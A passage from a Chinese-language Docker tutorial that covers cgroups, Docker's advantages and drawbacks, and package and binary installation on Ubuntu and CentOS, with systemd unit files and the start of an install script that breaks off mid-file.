freezer: 暂停和恢复 cgroup 任务
memory: 设置每个 cgroup 的内存限制以及产生内存资源报告
net_cls: 标记每个网络包以供 cgroup 方便使用
ns: 命名空间子系统
perf_event: 增加了对每 group 的监测跟踪的能力，可以监测属于某个特定的 group 的所有线程以及运行在特定CPU上的线程
```

#### 48.3.3 查看系统cgroups

```
[root@ubuntu1804 ~]#ll /sys/fs/cgroup/
total 0
drwxr-xr-x 15 root root 380 Jan 22 16:20 ./
drwxr-xr-x 10 root root   0 Jan 22 16:20 ../
dr-xr-xr-x  5 root root   0 Jan 22 16:20 blkio/
lrwxrwxrwx  1 root root  11 Jan 22 16:20 cpu -> cpu,cpuacct/
lrwxrwxrwx  1 root root  11 Jan 22 16:20 cpuacct -> cpu,cpuacct/
dr-xr-xr-x  5 root root   0 Jan 22 16:20 cpu,cpuacct/
dr-xr-xr-x  3 root root   0 Jan 22 16:20 cpuset/
dr-xr-xr-x  5 root root   0 Jan 22 16:20 devices/
dr-xr-xr-x  3 root root   0 Jan 22 16:20 freezer/
dr-xr-xr-x  3 root root   0 Jan 22 16:20 hugetlb/
dr-xr-xr-x  5 root root   0 Jan 22 16:20 memory/
lrwxrwxrwx  1 root root  16 Jan 22 16:20 net_cls -> net_cls,net_prio/
dr-xr-xr-x  3 root root   0 Jan 22 16:20 net_cls,net_prio/
lrwxrwxrwx  1 root root  16 Jan 22 16:20 net_prio -> net_cls,net_prio/
dr-xr-xr-x  3 root root   0 Jan 22 16:20 perf_event/
dr-xr-xr-x  5 root root   0 Jan 22 16:20 pids/
dr-xr-xr-x  2 root root   0 Jan 22 16:20 rdma/
dr-xr-xr-x  6 root root   0 Jan 22 16:20 systemd/
dr-xr-xr-x  5 root root   0 Jan 22 16:20 unified/


[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/cpu/docker/5dee9be9afdbab8c2f6c4c5eb0f956c9579efe93110daf638f8fd1
5f43d961e2/cpuacct.usage
4751336886
[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/memory/docker/5dee9be9afdbab8c2f6c4c5eb0f956c9579efe93110daf638f8
fd15f43d961e2/cpuacct.usage
cat: 
/sys/fs/cgroup/memory/docker/5dee9be9afdbab8c2f6c4c5eb0f956c9579efe93110daf638f8
fd15f43d961e2/cpuacct.usage: No such file or directory


[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/memory/docker/5dee9be9afdbab8c2f6c4c5eb0f956c9579efe93110daf638f8
fd15f43d961e2/memory.limit_in_bytes 
9223372036854771712
[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/memory/docker/5dee9be9afdbab8c2f6c4c5eb0f956c9579efe93110daf638f8
fd15f43d961e2/memory.max_usage_in_bytes 
79278080
```

### 48.4 Docker的优缺点

```
#Docker的优势
快速部署: 短时间内可以部署成百上千个应用，更快速交付到线上
高效虚拟化: 不需要额外hypervisor支持，基于linux内核实现应用虚拟化，相比虚拟机大幅提高性能和效率
节省开支: 提高服务器利用率，降低IT支出
简化配置: 将运行环境打包保存至容器，使用时直接启动即可
环境统一: 将开发，测试，生产的应用运行环境进行标准化和统一，减少环境不一样带来的各种问题
快速迁移和扩展: 可实现跨平台运行在物理机、虚拟机、公有云等环境，良好的兼容性可以方便将应用从A宿主机迁移到B宿主机，甚至是A平台迁移到B平台
更好的实现面向服务的架构,推荐一个容器只运行一个应用,实现分布的应用模型,可以方便的进行横向扩展,符合开发中高内聚,低耦合的要求,减少不同服务之间的相互影响



#Docker的缺点
多个容器共用宿主机的内核，各应用之间的隔离不如虚拟机彻底
由于和宿主机之间的进程也是隔离的,需要进入容器查看和调试容器内进程等资源,变得比较困难和繁琐
如果容器内进程需要查看和调试,需要在每个容器内都需要安装相应的工具,这也造成存储空间的重复浪费
```

### 48.5 Docker安装及基础命令介绍

#### 48.5.1 Docker安装准备

```
OS系统版本选择: 
Docker 目前已经支持多种操作系统的安装运行，比如Ubuntu、CentOS、Redhat、Debian、Fedora，甚至是还支持了Mac和Windows，在linux系统上需要内核版本在3.10或以上。


如果要布署到kubernets上，需要查看相关kubernets对docker版本要求的说明，比如: 
https://github.com/kubernetes/kubernetes/blob/v1.17.2/CHANGELOG-1.17.md
```

#### 48.5.2 安装和删除方法

```
官方文档 : https://docs.docker.com/engine/install/
阿里云文档: https://developer.aliyun.com/mirror/docker-ce?spm=a2c6h.13651102.0.0.3e221b11guHCWE
```

##### 48.5.2.1 Ubuntu安装和删除Docker

官方文档: https://docs.docker.com/install/linux/docker-ce/ubuntu/

**Ubuntu 14.04/16.04/18.04 安装docker** 

```
# step 1: 安装必要的一些系统工具
[10:18:43 liu@ubuntu1804 ~]$ sudo apt-get update
[10:18:43 liu@ubuntu1804 ~]$ sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common

# step 2: 安装GPG证书
[10:18:43 liu@ubuntu1804 ~]$ sudo curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -
OK

# Step 3: 写入软件源信息
[11:31:58 liu@ubuntu1804 ~]$ sudo add-apt-repository "deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable"


# Step 4: 更新并安装Docker-CE
[11:35:07 liu@ubuntu1804 ~]$ sudo apt-get -y update
# sudo apt-get -y install docker-ce=[VERSION]
[13:33:05 liu@ubuntu1804 ~]$sudo apt-get -y install docker-ce=5:18.09.9~3-0~ubuntu-bionic docker-ce-cli=5:18.09.9~3-0~ubuntu-bionic


# Step 5: 查看docker版本
[13:43:56 liu@ubuntu1804 ~]$sudo docker version
Client:
 Version:           18.09.9
 API version:       1.39
 Go version:        go1.11.13
 Git commit:        039a7df9ba
 Built:             Wed Sep  4 16:57:28 2019
 OS/Arch:           linux/amd64
 Experimental:      false

Server: Docker Engine - Community
 Engine:
  Version:          18.09.9
  API version:      1.39 (minimum version 1.12)
  Go version:       go1.11.13
  Git commit:       039a7df
  Built:            Wed Sep  4 16:19:38 2019
  OS/Arch:          linux/amd64
  Experimental:     false



#Step 6:安装指定版本的Docker-CE:
#查找Docker-CE的版本:
[11:38:20 liu@ubuntu1804 ~]$apt-cache madison docker-ce
 docker-ce | 5:20.10.17~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.16~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.15~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.14~3-0~ubuntu-bionic | https://336.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.13~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.12~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.11~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.10~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.9~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.8~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.7~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.6~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.5~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.4~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.3~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.2~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.1~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:20.10.0~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.15~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.14~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.13~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.12~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.11~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.10~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.9~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.8~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.7~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.6~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.5~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.4~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.3~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.2~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.1~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:19.03.0~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:18.09.9~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:18.09.8~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:18.09.7~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:18.09.6~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:18.09.5~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:18.09.4~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:18.09.3~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:18.09.2~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:18.09.1~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 5:18.09.0~3-0~ubuntu-bionic | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 18.06.3~ce~3-0~ubuntu | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 18.06.2~ce~3-0~ubuntu | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 18.06.1~ce~3-0~ubuntu | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 18.06.0~ce~3-0~ubuntu | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
 docker-ce | 18.03.1~ce~3-0~ubuntu | https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic/stable amd64 Packages
```

**删除docker**

```
[13:49:01 liu@ubuntu1804 ~]$sudo apt purge docker-ce=5:18.09.9~3-0~ubuntu-bionic docker-ce-cli=5:18.09.9~3-0~ubuntu-bionic
[13:49:48 liu@ubuntu1804 ~]$sudo rm -rf /var/lib/docker
```

##### 48.5.2.2 CentOS安装和删除Docker

**下载rpm包安装:**

```
官方rpm包下载地址:
https://download.docker.com/linux/centos/7/x86_64/stable/Packages/
阿里镜像下载地址:
https://mirrors.aliyun.com/docker-ce/linux/centos/7/x86_64/stable/Packages/
```

**CentOS 7安装:** 

```
#CentOS 7安装docker依赖yum源:docker-ce.repo
[root@centos7 ~]# yum -y install wget

#配置docker仓库
[root@centos7 ~]# vim /etc/yum.repos.d/docker-ce.repo
[docker-ce-stable]
name=Docker CE Stable - $basearch
baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/stable
enabled=1
gpgcheck=1
gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg

[docker-ce-stable-debuginfo]
name=Docker CE Stable - Debuginfo $basearch
baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/stable
enabled=0
gpgcheck=1
gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg

[docker-ce-stable-source]
name=Docker CE Stable - Sources
baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/stable
enabled=0
gpgcheck=1
gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg

[docker-ce-test]
name=Docker CE Test - $basearch
baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/test
enabled=0
gpgcheck=1
gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg

[docker-ce-test-debuginfo]
name=Docker CE Test - Debuginfo $basearch
baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/test
enabled=0
gpgcheck=1
gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg

[docker-ce-test-source]
name=Docker CE Test - Sources
baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/test
enabled=0
gpgcheck=1
gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg

[docker-ce-nightly]
name=Docker CE Nightly - $basearch
baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/nightly
enabled=0
gpgcheck=1
gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg

[docker-ce-nightly-debuginfo]
name=Docker CE Nightly - Debuginfo $basearch
baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/nightly
enabled=0
gpgcheck=1
gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg

[docker-ce-nightly-source]
name=Docker CE Nightly - Sources
baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/nightly
enabled=0
gpgcheck=1
gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg


#查看可以安装的docker的版本
[root@centos7 yum.repos.d]# yum list docker-ce
Loaded plugins: fastestmirror
Loading mirror speeds from cached hostfile
 * base: 
 * epel: mirrors.cloud.tencent.com
 * extras: mirrors.aliyun.com
Available Packages
docker-ce.x86_64                   3:20.10.17-3.el7                           docker-ce-stable


#安装指定版本的Docker-CE:
[root@centos7 yum.repos.d]# yum list docker-ce.x86_64 --showduplicates | sort -r
Loading mirror speeds from cached hostfile
Loaded plugins: fastestmirror
 * extras: mirrors.aliyun.com
 * epel: mirrors.cloud.tencent.com
docker-ce.x86_64            3:20.10.9-3.el7                     docker-ce-stable
docker-ce.x86_64            3:20.10.8-3.el7                     docker-ce-stable
docker-ce.x86_64            3:20.10.7-3.el7                     docker-ce-stable
docker-ce.x86_64            3:20.10.6-3.el7                     docker-ce-stable
docker-ce.x86_64            3:20.10.5-3.el7                     docker-ce-stable
docker-ce.x86_64            3:20.10.4-3.el7                     docker-ce-stable
docker-ce.x86_64            3:20.10.3-3.el7                     docker-ce-stable
docker-ce.x86_64            3:20.10.2-3.el7                     docker-ce-stable
docker-ce.x86_64            3:20.10.17-3.el7                    docker-ce-stable
docker-ce.x86_64            3:20.10.16-3.el7                    docker-ce-stable
docker-ce.x86_64            3:20.10.15-3.el7                    docker-ce-stable
docker-ce.x86_64            3:20.10.14-3.el7                    docker-ce-stable
docker-ce.x86_64            3:20.10.1-3.el7                     docker-ce-stable
docker-ce.x86_64            3:20.10.13-3.el7                    docker-ce-stable
docker-ce.x86_64            3:20.10.12-3.el7                    docker-ce-stable
docker-ce.x86_64            3:20.10.11-3.el7                    docker-ce-stable
docker-ce.x86_64            3:20.10.10-3.el7                    docker-ce-stable
docker-ce.x86_64            3:20.10.0-3.el7                     docker-ce-stable
docker-ce.x86_64            3:19.03.9-3.el7                     docker-ce-stable
docker-ce.x86_64            3:19.03.8-3.el7                     docker-ce-stable
docker-ce.x86_64            3:19.03.7-3.el7                     docker-ce-stable
docker-ce.x86_64            3:19.03.6-3.el7                     docker-ce-stable
docker-ce.x86_64            3:19.03.5-3.el7                     docker-ce-stable
docker-ce.x86_64            3:19.03.4-3.el7                     docker-ce-stable
docker-ce.x86_64            3:19.03.3-3.el7                     docker-ce-stable
docker-ce.x86_64            3:19.03.2-3.el7                     docker-ce-stable
docker-ce.x86_64            3:19.03.15-3.el7                    docker-ce-stable
docker-ce.x86_64            3:19.03.14-3.el7                    docker-ce-stable
docker-ce.x86_64            3:19.03.1-3.el7                     docker-ce-stable
docker-ce.x86_64            3:19.03.13-3.el7                    docker-ce-stable
docker-ce.x86_64            3:19.03.12-3.el7                    docker-ce-stable
docker-ce.x86_64            3:19.03.11-3.el7                    docker-ce-stable
docker-ce.x86_64            3:19.03.10-3.el7                    docker-ce-stable
docker-ce.x86_64            3:19.03.0-3.el7                     docker-ce-stable
docker-ce.x86_64            3:18.09.9-3.el7                     docker-ce-stable
docker-ce.x86_64            3:18.09.8-3.el7                     docker-ce-stable
docker-ce.x86_64            3:18.09.7-3.el7                     docker-ce-stable
docker-ce.x86_64            3:18.09.6-3.el7                     docker-ce-stable
docker-ce.x86_64            3:18.09.5-3.el7                     docker-ce-stable
docker-ce.x86_64            3:18.09.4-3.el7                     docker-ce-stable
docker-ce.x86_64            3:18.09.3-3.el7                     docker-ce-stable
docker-ce.x86_64            3:18.09.2-3.el7                     docker-ce-stable
docker-ce.x86_64            3:18.09.1-3.el7                     docker-ce-stable
docker-ce.x86_64            3:18.09.0-3.el7                     docker-ce-stable
docker-ce.x86_64            18.06.3.ce-3.el7                    docker-ce-stable
docker-ce.x86_64            18.06.2.ce-3.el7                    docker-ce-stable
docker-ce.x86_64            18.06.1.ce-3.el7                    docker-ce-stable
docker-ce.x86_64            18.06.0.ce-3.el7                    docker-ce-stable
docker-ce.x86_64            18.03.1.ce-1.el7.centos             docker-ce-stable
docker-ce.x86_64            18.03.0.ce-1.el7.centos             docker-ce-stable
docker-ce.x86_64            17.12.1.ce-1.el7.centos             docker-ce-stable
docker-ce.x86_64            17.12.0.ce-1.el7.centos             docker-ce-stable
docker-ce.x86_64            17.09.1.ce-1.el7.centos             docker-ce-stable
docker-ce.x86_64            17.09.0.ce-1.el7.centos             docker-ce-stable
docker-ce.x86_64            17.06.2.ce-1.el7.centos             docker-ce-stable
docker-ce.x86_64            17.06.1.ce-1.el7.centos             docker-ce-stable
docker-ce.x86_64            17.06.0.ce-1.el7.centos             docker-ce-stable
docker-ce.x86_64            17.03.3.ce-1.el7                    docker-ce-stable
docker-ce.x86_64            17.03.2.ce-1.el7.centos             docker-ce-stable
docker-ce.x86_64            17.03.1.ce-1.el7.centos             docker-ce-stable
docker-ce.x86_64            17.03.0.ce-1.el7.centos             docker-ce-stable
 * base: 
Available Packages



#安装docker指定版本
[root@centos7 yum.repos.d]# yum -y install docker-ce-19.03.12-3.el7 docker-ce-cli-19.03.12-3.el7
```

**Centos8安装**

```
[root@centos8 ~]# vim /etc/yum.repos.d/docker.repo
[docker]
name=docker
baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/8/x86_64/stable/
gpgcheck=0


[root@centos8 ~]# wget https://download.docker.com/linux/centos/7/x86_64/stable/Packages/containerd.io-1.4.10-3.1.el7.x86_64.rpm
[root@centos8 ~]# yum -y install containerd.io-1.4.10-3.1.el7.x86_64.rpm


[root@centos8 ~]# yum list docker-ce
Last metadata expiration check: 0:00:22 ago on Sun 31 Jul 2022 02:39:05 PM CST.
Available Packages
docker-ce.x86_64                   3:20.10.17-3.el8                          docker


[root@centos8 ~]# yum list docker-ce.x86_64 --showduplicates | sort -r
Last metadata expiration check: 0:04:22 ago on Sun 31 Jul 2022 02:39:05 PM CST.
docker-ce.x86_64                     3:20.10.9-3.el8                      docker
docker-ce.x86_64                     3:20.10.8-3.el8                      docker
docker-ce.x86_64                     3:20.10.7-3.el8                      docker
docker-ce.x86_64                     3:20.10.6-3.el8                      docker
docker-ce.x86_64                     3:20.10.5-3.el8                      docker
docker-ce.x86_64                     3:20.10.4-3.el8                      docker
docker-ce.x86_64                     3:20.10.3-3.el8                      docker
docker-ce.x86_64                     3:20.10.2-3.el8                      docker
docker-ce.x86_64                     3:20.10.17-3.el8                     docker
docker-ce.x86_64                     3:20.10.16-3.el8                     docker
docker-ce.x86_64                     3:20.10.15-3.el8                     docker
docker-ce.x86_64                     3:20.10.14-3.el8                     docker
docker-ce.x86_64                     3:20.10.1-3.el8                      docker
docker-ce.x86_64                     3:20.10.13-3.el8                     docker
docker-ce.x86_64                     3:20.10.12-3.el8                     docker
docker-ce.x86_64                     3:20.10.11-3.el8                     docker
docker-ce.x86_64                     3:20.10.10-3.el8                     docker
docker-ce.x86_64                     3:20.10.0-3.el8                      docker
docker-ce.x86_64                     3:19.03.15-3.el8                     docker
docker-ce.x86_64                     3:19.03.14-3.el8                     docker
docker-ce.x86_64                     3:19.03.13-3.el8                     docker


[root@centos8 ~]# yum -y install docker-ce
[root@centos8 ~]# systemctl start docker
[root@centos8 ~]# docker version
Client: Docker Engine - Community
 Version:           20.10.17
 API version:       1.41
 Go version:        go1.17.11
 Git commit:        100c701
 Built:             Mon Jun  6 23:03:11 2022
 OS/Arch:           linux/amd64
 Context:           default
 Experimental:      true

Server: Docker Engine - Community
 Engine:
  Version:          20.10.17
  API version:      1.41 (minimum version 1.12)
  Go version:       go1.17.11
  Git commit:       a89b842
  Built:            Mon Jun  6 23:01:29 2022
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.4.10
  GitCommit:        8848fdb7c4ae3815afcc990a8a99d663dda1b590
 runc:
  Version:          1.0.2
  GitCommit:        v1.0.2-0-g52b36a2
 docker-init:
  Version:          0.19.0
  GitCommit:        de40ad0
```

**centos删除docker**

```
[root@centos7 ~]#yum remove docker-ce-{version} docker-ce-cli-{version}

#删除docker资源存放的相关文件
[root@centos7 ~]# rm -rf /var/lib/docker
```

##### 48.5.2.3 二进制安装Docker

**适用场景**

```
#本方法适用于无法上网或无法通过包安装方式安装的主机上安装docker

二进制安装下载路径：
https://download.docker.com/linux/
https://mirrors.aliyun.com/docker-ce/linux/static/stable/x86_64/
```

**范例: 在CentOS8上实现二进制安装docker**

```
#1.下载二进制包
[root@centos7 ~]# wget https://mirrors.aliyun.com/docker-ce/linux/static/stable/x86_64/docker-19.03.10.tgz
[root@centos7 ~]# tar xvf docker-19.03.10.tgz
[root@centos7 ~]# cp docker/* /usr/bin/
[root@centos7 ~]# cd /lib/systemd/system/



#2.创建service文件
[root@centos7 ~]# vim /lib/systemd/system/docker.service
[Unit]
Description=Docker Application Container Engine
Documentation=https://docs.docker.com
BindsTo=containerd.service
After=network-online.target firewalld.service containerd.service
Wants=network-online.target
Requires=docker.socket

[Service]
Type=notify
# the default is not to use systemd for cgroups because the delegate issues still
# exists and systemd currently does not support the cgroup feature set required
# for containers run by docker
ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
ExecReload=/bin/kill -s HUP $MAINPID
TimeoutSec=0
RestartSec=2
Restart=always

# Note that StartLimit* options were moved from "Service" to "Unit" in systemd 229.
# Both the old, and new location are accepted by systemd 229 and up, so using the old location
# to make them work for either version of systemd.
StartLimitBurst=3

# Note that StartLimitInterval was renamed to StartLimitIntervalSec in systemd 230.
# Both the old, and new name are accepted by systemd 230 and up, so using the old name to make
# this option work for either version of systemd.
StartLimitInterval=60s

# Having non-zero Limit*s causes performance problems due to accounting overhead
# in the kernel. We recommend using cgroups to do container-local accounting.
LimitNOFILE=infinity
LimitNPROC=infinity
LimitCORE=infinity

# Comment TasksMax if your systemd version does not supports it.
# Only systemd 226 and above support this option.
TasksMax=infinity

# set delegate yes so that systemd does not reset the cgroups of docker containers
Delegate=yes

# kill only the docker process, not all processes in the cgroup
KillMode=process

[Install]
WantedBy=multi-user.target




#3.创建socket文件
[root@centos7 ~]# vim /lib/systemd/system/docker.socket 
[Unit]
Description=Docker Socket for the API
PartOf=docker.service

[Socket]
ListenStream=/var/run/docker.sock
SocketMode=0660
SocketUser=root
SocketGroup=docker

[Install]
WantedBy=sockets.target




#4.创建containerd.service文件
[root@centos7 ~]# vim /lib/systemd/system/containerd.service
# Copyright The containerd Authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

[Unit]
Description=containerd container runtime
Documentation=https://containerd.io
After=network.target local-fs.target

[Service]
ExecStartPre=-/sbin/modprobe overlay
ExecStart=/usr/bin/containerd

Type=notify
Delegate=yes
KillMode=process
Restart=always
RestartSec=5
# Having non-zero Limit*s causes performance problems due to accounting overhead
# in the kernel. We recommend using cgroups to do container-local accounting.
LimitNPROC=infinity
LimitCORE=infinity
LimitNOFILE=infinity
# Comment TasksMax if your systemd version does not supports it.
# Only systemd 226 and above support this version.
TasksMax=infinity
OOMScoreAdjust=-999

[Install]
WantedBy=multi-user.target



#5.启动服务
[root@centos7 ~]#  groupadd -r docker
[root@centos7 ~]# systemctl daemon-reload
[root@centos7 ~]# dockerd
[root@centos7 ~]# systemctl start docker




#测试docker是否可用
[root@centos7 ~]# docker run hello-world
Unable to find image 'hello-world:latest' locally
latest: Pulling from library/hello-world
2db29710123e: Pull complete 
Digest: sha256:2498fce14358aa50ead0cc6c19990fc6ff866ce72aeb5546e1d59caac3d0d60f
Status: Downloaded newer image for hello-world:latest

Hello from Docker!
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.
    (amd64)
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:
 https://hub.docker.com/

For more examples and ideas, visit:
 https://docs.docker.com/get-started/
```

**一键安装二进制docker脚本**

```
#!/bin/bash
#
#**********************************************************************************************
#Author:        liusenbiao
#QQ:            1805336068
#Date:          2022-07-31
#FileName:      install_docker_binary.sh
#System:        适用版本:centos 7/8 & ubuntu 18.04/20.04
#Description:   一键安装二进制docker
#*********************************************************************************************
SRC_DIR=/usr/local/src
COLOR="echo -e \\033[01;31m"
END='\033[0m'
URL='https://mirrors.cloud.tencent.com/docker-ce/linux/static/stable/x86_64/'
DOCKER_FILE=docker-19.03.10.tgz

os(){
    OS_ID=`sed -rn '/^NAME=/s@.*="([[:alpha:]]+).*"$@\1@p' /etc/os-release`
}

check_file (){
    cd ${SRC_DIR}
    rpm -q wget &> /dev/null || yum -y install wget &> /dev/null
    if [ ! -e ${DOCKER_FILE} ];then
        ${COLOR}"缺少${DOCKER_FILE}文件,如果是离线包,请把文件放到${SRC_DIR}目录下"${END}
        ${COLOR}'开始下载DOCKER二进制安装包'${END}
        wget ${URL}${DOCKER_FILE} || { ${COLOR}"DOCKER二进制安装包下载失败"${END}; exit; } 
    else
        ${COLOR}"相关文件已准备好"${END}
    fi
}

install(){ 
    [ -f /usr/bin/docker ] && { ${COLOR}"DOCKER已存在，安装失败"${END};exit; }
    ${COLOR}"开始安装DOCKER..."${END}
    tar xf ${DOCKER_FILE} 
    mv docker/* /usr/bin/
    cat > /lib/systemd/system/docker.service <<-EOF
[Unit]
